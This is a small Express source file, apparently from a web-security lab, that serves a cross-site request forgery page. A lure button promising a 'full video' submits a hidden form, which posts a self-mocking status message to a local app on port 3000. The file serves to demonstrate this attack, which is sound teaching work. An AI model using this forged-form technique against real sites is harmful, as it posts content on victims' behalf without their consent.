import express from 'express'
import cookieParser from 'cookie-parser'
import pkg from 'body-parser'
const { urlencoded } = pkg

const PORT = 3300
const app = express()
app.use(cookieParser())
app.use(urlencoded({ extended: false }))

// Trang chứa nội dung dụ dỗ người dùng click
app.get('/', (req, res) => {
    res.send(`
  <html><body>
  <form action='http://localhost:3000/status' method='post'>
    <input type="text" name="content" value='Tôi hồ đồ quá, tôi đã bị hack' style="display: none" />
    <button type="submit">Click vào đây để xem full video</button>
  </form>
  </body></html>
  `)
})

app.listen(PORT, () => {
    // eslint-disable-next-line no-undef
    console.log(`Hacker Server is running on http://127.0.0.1:${PORT}`)
})
